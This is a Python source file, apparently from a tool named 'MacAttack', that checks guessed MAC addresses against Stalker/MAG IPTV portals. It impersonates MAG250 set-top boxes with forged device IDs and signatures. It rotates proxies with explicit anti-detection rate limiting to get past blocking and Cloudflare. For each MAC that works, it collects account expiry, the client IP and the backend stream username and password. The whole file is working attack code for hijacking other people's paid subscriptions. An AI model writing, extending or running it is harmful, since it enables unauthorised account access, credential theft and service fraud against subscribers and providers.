"""
STB API Client v3.1 - Maximum Performance Edition
- HTTP/2 Connection Pooling for speed
- DNS Caching for faster lookups
- Optimized proxy rotation
- 2-Phase: QuickScan (Token + Channels) → FullScan (Details)
- Proper error classification for proxy retry
"""
import asyncio
import aiohttp
import hashlib
import json
import time
import random
import logging
from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any, List
import socket

logger = logging.getLogger("MacAttack.stb")

# ============== PERFORMANCE OPTIMIZATIONS ==============

class DNSCache:
    """DNS resolution cache for faster lookups."""
    
    def __init__(self, ttl: int = 300):  # 5 minutes TTL
        self.cache = {}
        self.ttl = ttl
    
    async def resolve(self, hostname: str) -> Optional[str]:
        """Resolve hostname with caching."""
        now = time.time()
        
        # Check cache
        if hostname in self.cache:
            ip, timestamp = self.cache[hostname]
            if now - timestamp < self.ttl:
                return ip
        
        # Resolve and cache
        try:
            loop = asyncio.get_event_loop()
            # Use proper DNS resolution
            result = await loop.getaddrinfo(hostname, None, family=socket.AF_INET)
            if result:
                resolved_ip = result[0][4][0]
                self.cache[hostname] = (resolved_ip, now)
                return resolved_ip
        except Exception as e:
            logger.debug(f"DNS resolution failed for {hostname}: {e}")
        
        return None

class OptimizedConnector:
    """Optimized HTTP connector with connection pooling and DNS caching."""
    
    def __init__(self, max_workers: int = 100, connections_per_host: int = 5):
        self.dns_cache = DNSCache()
        self.connector = None
        self.max_workers = max_workers
        self.connections_per_host = connections_per_host
        self._setup_connector()
    
    def _setup_connector(self):
        """Setup optimized aiohttp connector with anti-detection measures."""
        # Try to use custom resolver with DNS caching, fallback to default
        resolver = None
        try:
            resolver = aiohttp.AsyncResolver()
        except Exception:
            # aiodns not available, use default resolver
            resolver = None
        
        # CONFIGURABLE connector settings
        self.connector = aiohttp.TCPConnector(
            # Connection pooling - CONFIGURABLE
            limit=min(self.max_workers, 500),     # Total connections
            limit_per_host=self.connections_per_host,  # CONFIGURABLE connections per host
            
            # Anti-detection measures
            use_dns_cache=True,                   # DNS caching OK
            resolver=resolver,                    # Optional resolver
            
            # Connection management - choose one approach
            force_close=False,                    # Allow connection reuse for better performance
            keepalive_timeout=30,                 # Connection keepalive (30s)
            enable_cleanup_closed=True,           # Clean up closed connections
            
            # DNS cache TTL
            ttl_dns_cache=300,                    # 5 minutes DNS cache
        )
    
    def get_connector(self) -> aiohttp.TCPConnector:
        """Get the optimized connector."""
        return self.connector
    
    async def close(self):
        """Close the connector."""
        if self.connector:
            await self.connector.close()

# Global optimized connector
_optimized_connector = None

def get_optimized_connector(max_workers: int = 100, connections_per_host: int = 5) -> aiohttp.TCPConnector:
    """Get or create optimized connector with configurable limits."""
    global _optimized_connector
    if _optimized_connector is None or _optimized_connector.connections_per_host != connections_per_host:
        _optimized_connector = OptimizedConnector(max_workers, connections_per_host)
    return _optimized_connector.get_connector()

# ============== OPTIMIZED PROXY ROTATION ==============

class SmartProxyRotator:
    """Intelligent proxy rotation with anti-detection measures."""
    
    def __init__(self):
        self.proxy_stats = {}  
        self.proxy_queue = []  
        self.last_rotation = 0
        self.request_delays = {}  # proxy -> last_request_time
    
    def add_proxy(self, proxy: str):
        """Add proxy to rotation."""
        if proxy not in self.proxy_stats:
            self.proxy_stats[proxy] = {
                "speed": 1000,  
                "success": 0,
                "fail": 0,
                "last_used": 0,
                "consecutive_fails": 0,
                "requests_per_minute": 0,
                "last_minute_start": time.time()
            }
            self.request_delays[proxy] = 0
    
    def get_best_proxy(self, proxies: List[str], avoid_proxy: Optional[str] = None) -> Optional[str]:
        """Get best available proxy with rate limiting and anti-detection."""
        if not proxies:
            return None
        
        # Add new proxies
        for proxy in proxies:
            self.add_proxy(proxy)
        
        now = time.time()
        available = []
        
        for proxy in proxies:
            stats = self.proxy_stats[proxy]
            
            # Skip if too many consecutive failures
            if stats["consecutive_fails"] >= 3:  # Reduced from 5 to 3
                continue
            
            # Skip if we want to avoid this proxy
            if proxy == avoid_proxy:
                continue
            
            # ANTI-DETECTION: Rate limiting per proxy
            last_request = self.request_delays.get(proxy, 0)
            if now - last_request < 0.5:  # Minimum 500ms between requests per proxy
                continue
            
            # ANTI-DETECTION: Max requests per minute per proxy
            if now - stats["last_minute_start"] > 60:
                stats["requests_per_minute"] = 0
                stats["last_minute_start"] = now
            
            if stats["requests_per_minute"] >= 30:  # Max 30 requests per minute per proxy
                continue
            
            # Calculate score (lower = better)
            total_requests = stats["success"] + stats["fail"]
            if total_requests > 0:
                fail_rate = stats["fail"] / total_requests
                score = stats["speed"] * (1 + fail_rate * 3)  # Higher penalty for failures
            else:
                score = stats["speed"]
            
            available.append((proxy, score))
        
        if not available:
            # If no proxies available, wait a bit and reset some limits
            logger.warning("No proxies available due to rate limiting - backing off")
            return None
        
        # Sort by score and use round-robin among top proxies
        available.sort(key=lambda x: x[1])
        top_count = max(1, min(3, len(available)))  # Use max 3 best proxies
        top_proxies = [p[0] for p in available[:top_count]]
        
        # Simple round-robin
        selected_proxy = top_proxies[int(now) % len(top_proxies)]
        
        # Update request tracking
        self.request_delays[selected_proxy] = now
        self.proxy_stats[selected_proxy]["requests_per_minute"] += 1
        
        return selected_proxy
    
    def record_success(self, proxy: str, response_time_ms: float):
        """Record successful request."""
        if proxy in self.proxy_stats:
            stats = self.proxy_stats[proxy]
            stats["success"] += 1
            stats["consecutive_fails"] = 0
            stats["last_used"] = time.time()
            
            # Update average speed (exponential moving average)
            if stats["speed"] == 0:
                stats["speed"] = response_time_ms
            else:
                stats["speed"] = stats["speed"] * 0.9 + response_time_ms * 0.1  # Slower adaptation
    
    def record_failure(self, proxy: str, error_type: str):
        """Record failed request."""
        if proxy in self.proxy_stats:
            stats = self.proxy_stats[proxy]
            stats["fail"] += 1
            stats["consecutive_fails"] += 1
            stats["last_used"] = time.time()
            
            # If blocked, increase penalty
            if error_type == "blocked":
                stats["consecutive_fails"] += 2  # Extra penalty for being blocked

# Global smart proxy rotator
_smart_rotator = SmartProxyRotator()

# ============== ERROR TYPES ==============

class ProxyError(Exception):
    """Base proxy error - retry MAC with different proxy"""
    pass

class ProxyDeadError(ProxyError):
    """Proxy unreachable (connection refused, DNS fail)"""
    pass

class ProxySlowError(ProxyError):
    """Proxy timeout"""
    pass

class ProxyBlockedError(ProxyError):
    """Proxy blocked by portal (403, rate limit)"""
    pass

class PortalError(Exception):
    """Portal-side error - MAC is actually invalid"""
    pass

# ============== HELPERS ==============

def parse_proxy(proxy_str: Optional[str]) -> Optional[str]:
    """Parse proxy string to aiohttp format."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://", "http://")):
        return proxy_str
    return f"http://{proxy_str}"

def generate_device_ids(mac: str) -> Tuple[str, str, str, str]:
    """Generate device IDs from MAC."""
    sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    return sn, device_id, device_id2, hw_version_2

def get_headers(token: Optional[str] = None, token_random: Optional[int] = None) -> Dict[str, str]:
    """Get request headers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "close",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if token_random is not None:
        headers["X-Random"] = str(token_random)
    return headers

def get_cookies(mac: str) -> Dict[str, str]:
    """Get request cookies."""
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    return {
        "adid": hw_version_2, "debug": "1", "device_id2": device_id2,
        "device_id": device_id, "hw_version": "1.7-BD-00", "mac": mac,
        "sn": sn, "stb_lang": "en", "timezone": "America/Los_Angeles",
    }

def get_portal_info(url: str) -> Tuple[str, str]:
    """Extract base URL and portal type from URL."""
    url = url.rstrip('/')
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    base = f"{scheme}://{host}:{port}"
    
    if "stalker_portal" in url:
        return base, "stalker_portal/server/load.php"
    return base, "portal.php"

# ============== ASYNC HTTP CLIENT ==============

async def do_request(session: aiohttp.ClientSession, url: str, cookies: Dict, headers: Dict, 
                    proxy: Optional[str], timeout: int) -> aiohttp.ClientResponse:
    """
    Make optimized async HTTP request with connection pooling.
    
    Raises:
    - ProxyDeadError: Connection refused, DNS fail, proxy unreachable
    - ProxySlowError: Timeout, gateway errors
    - ProxyBlockedError: 403, 429, Cloudflare/Captcha
    - PortalError: Portal-side errors (401, backend not available)
    """
    # Optimized timeout configuration
    timeout_config = aiohttp.ClientTimeout(
        connect=2,        # Faster connection timeout
        total=timeout,    # Total request timeout
        sock_read=5       # Socket read timeout
    )
    
    try:
        async with session.get(url, cookies=cookies, headers=headers, 
                              proxy=proxy, timeout=timeout_config) as resp:
            
            # Read response content
            content = await resp.text()
            
            # Check for portal errors (not proxy related)
            if "REMOTE_ADDR" in content or "Backend not available" in content:
                raise PortalError("Portal backend error")
            
            # Check for Cloudflare / HTML error pages
            content_type = resp.headers.get("Content-Type", "").lower()
            if "text/html" in content_type:
                if "cloudflare" in content.lower() or "captcha" in content.lower():
                    raise ProxyBlockedError("Cloudflare/Captcha detected")
                if resp.status >= 400:
                    raise ProxyBlockedError(f"HTTP {resp.status} - HTML response")
            
            # HTTP 401 = Portal says MAC is invalid (not proxy issue)
            if resp.status == 401:
                raise PortalError("401 Unauthorized - Invalid MAC")
            
            # HTTP 403 = Could be proxy blocked OR MAC invalid
            if resp.status == 403:
                try:
                    data = await resp.json()
                    if isinstance(data, dict):
                        # Valid JSON response = Portal error, not proxy
                        raise PortalError("403 Forbidden - Portal rejected MAC")
                except:
                    pass
                # Invalid JSON = Proxy blocked
                raise ProxyBlockedError("403 Forbidden - Proxy blocked")
            
            # Gateway errors = Proxy slow/overloaded
            if resp.status in (502, 503, 504):
                raise ProxySlowError(f"Gateway error {resp.status}")
            
            # 429 = Rate limit (proxy blocked)
            if resp.status == 429:
                raise ProxyBlockedError("Rate limit exceeded")
            
            # Create response-like object for compatibility
            class AsyncResponse:
                def __init__(self, status, content, headers):
                    self.status_code = status
                    self.text = content
                    self.headers = headers
                
                def json(self):
                    return json.loads(self.text)
            
            return AsyncResponse(resp.status, content, resp.headers)
            
    except asyncio.TimeoutError:
        raise ProxySlowError("Request timeout")
    except aiohttp.ClientConnectorError as e:
        err = str(e).lower()
        if any(x in err for x in ["refused", "unreachable", "no route", "dns"]):
            raise ProxyDeadError(str(e))
        raise ProxySlowError(str(e))
    except aiohttp.ClientProxyConnectionError:
        raise ProxyDeadError("Proxy connection error")
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError):
        raise
    except Exception as e:
        raise ProxyError(str(e))

# ============== OPTIMIZED SESSION MANAGEMENT ==============

async def create_optimized_session(max_workers: int = 100, connections_per_host: int = 5) -> aiohttp.ClientSession:
    """Create optimized aiohttp session with connection pooling."""
    connector = get_optimized_connector(max_workers, connections_per_host)
    
    # Optimized session configuration
    session = aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=30),  # Default timeout
        headers={
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
        },
        # Enable HTTP/2 if server supports it
        connector_owner=False,  # Don't close connector when session closes
    )
    
    return session

# ============== QUICKSCAN FUNCTION ==============

async def quickscan_mac(session: aiohttp.ClientSession, url: str, mac: str, 
                       proxy: Optional[str] = None, timeout: int = 10) -> Tuple[bool, Dict[str, Any]]:
    """
    QuickScan MAC - Fast validation with Token + Channel count
    
    Returns: (is_valid, result_dict)
    - is_valid: True if token received AND channels > 0
    - result_dict: Basic info (mac, channels, token data)
    
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    headers = get_headers()
    
    result = {
        "mac": mac,
        "channels": 0,
        "token": None,
        "token_random": None,
        "portal_type": portal_type,
    }
    
    # Step 1: Handshake - Get token
    handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    resp = await do_request(session, handshake_url, cookies, headers, proxy, timeout)
    
    # Parse token
    try:
        data = resp.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
    except (json.JSONDecodeError, ValueError) as e:
        raise ProxySlowError(f"Invalid JSON response: {e}")
    
    if not token:
        raise PortalError("No token received")
    
    result["token"] = token
    result["token_random"] = token_random
    
    # Step 2: Get channels count (critical for validation)
    headers = get_headers(token, token_random)
    ch_url = f"{base_url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
    
    resp = await do_request(session, ch_url, cookies, headers, proxy, timeout)
    
    try:
        data = resp.json()
    except (json.JSONDecodeError, ValueError):
        raise ProxySlowError("Invalid JSON in get_channels")
    
    if "js" in data and "data" in data["js"]:
        result["channels"] = len(data["js"]["data"])
    
    # QuickScan validation: Token + Channels > 0
    is_valid = result["channels"] > 0
    
    if not is_valid:
        raise PortalError(f"No channels available ({result['channels']})")
    
    return True, result

# ============== FULLSCAN FUNCTION ==============

async def fullscan_mac(session: aiohttp.ClientSession, url: str, mac: str, quickscan_result: Dict[str, Any],
                      proxy: Optional[str] = None, timeout: int = 15) -> Tuple[bool, Dict[str, Any]]:
    """
    FullScan MAC - Collect all details after successful QuickScan
    
    Args:
        quickscan_result: Result from successful quickscan_mac()
    
    Returns: (success, full_result_dict)
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    
    token = quickscan_result["token"]
    token_random = quickscan_result["token_random"]
    headers = get_headers(token, token_random)
    
    # Start with quickscan data
    result = {
        "mac": mac,
        "portal": url,
        "channels": quickscan_result["channels"],
        "expiry": "Unknown",
        "genres": [],
        "vod_categories": [],
        "series_categories": [],
        "backend_url": None,
        "username": None,
        "password": None,
        "max_connections": None,
        "created_at": None,
        "client_ip": None,
    }
    
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    
    # Calculate sig
    if token_random:
        sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
    else:
        sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
    
    metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
                          "uid": device_id, "random": token_random or 0})
    
    # Step 1: Get profile for IP and billing date
    try:
        profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}&api_sig=262&prehash=0"
        resp = await do_request(session, profile_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["client_ip"] = data["js"].get("ip")
                if data["js"].get("expire_billing_date"):
                    result["expiry"] = data["js"]["expire_billing_date"]
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 2: Get account info for expiry
    try:
        main_url = f"{base_url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        resp = await do_request(session, main_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            js = data.get("js", {})
            phone = js.get("phone", "")
            
            if phone:
                try:
                    # Try to convert Unix timestamp to readable date
                    timestamp = int(phone)
                    expiry = time.strftime("%B %d, %Y", time.gmtime(timestamp))
                    result["expiry"] = expiry
                except (ValueError, TypeError):
                    result["expiry"] = str(phone)
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 3: Get genres (for DE detection)
    try:
        g_url = f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        resp = await do_request(session, g_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["genres"] = [g.get("title", "") for g in data["js"] if g.get("id") != "*"]
        except:
            pass
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 4: Get VOD categories (non-critical)
    try:
        v_url = f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        resp = await do_request(session, v_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["vod_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
        except:
            pass
    except:
        pass
    
    # Step 5: Get series categories (non-critical)
    try:
        s_url = f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
        resp = await do_request(session, s_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            if "js" in data:
                result["series_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
        except:
            pass
    except:
        pass
    
    # Step 6: Get backend/credentials (non-critical)
    try:
        link_url = f"{base_url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
        resp = await do_request(session, link_url, cookies, headers, proxy, timeout)
        
        try:
            data = resp.json()
            cmd = data.get("js", {}).get("cmd", "")
            if cmd:
                cmd = cmd.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
                parsed = urlparse(cmd)
                if parsed.hostname:
                    result["backend_url"] = f"{parsed.scheme}://{parsed.hostname}"
                    if parsed.port:
                        result["backend_url"] += f":{parsed.port}"
                    parts = parsed.path.strip("/").split("/")
                    if len(parts) >= 2:
                        result["username"], result["password"] = parts[0], parts[1]
        except:
            pass
    except:
        pass
    
    return True, result

# ============== COMBINED TEST FUNCTION ==============

async def test_mac_async(session: aiohttp.ClientSession, url: str, mac: str, 
                        proxy: Optional[str] = None, timeout: int = 15, 
                        quickscan_only: bool = False) -> Tuple[bool, Dict[str, Any]]:
    """
    Test MAC with 2-phase approach:
    1. QuickScan: Token + Channels validation
    2. FullScan: Complete details collection (if quickscan_only=False)
    
    Returns: (is_valid, result_dict)
    
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError
    """
    # Phase 1: QuickScan
    try:
        quickscan_success, quickscan_result = await quickscan_mac(session, url, mac, proxy, timeout)
        
        if not quickscan_success:
            return False, quickscan_result
        
        # If only quickscan requested, return early
        if quickscan_only:
            return True, quickscan_result
        
        # Phase 2: FullScan
        fullscan_success, fullscan_result = await fullscan_mac(session, url, mac, quickscan_result, proxy, timeout)
        
        return fullscan_success, fullscan_result
        
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError, PortalError):
        raise
    except Exception as e:
        logger.error(f"Unexpected error testing MAC {mac}: {e}")
        return False, {"mac": mac, "error": str(e)}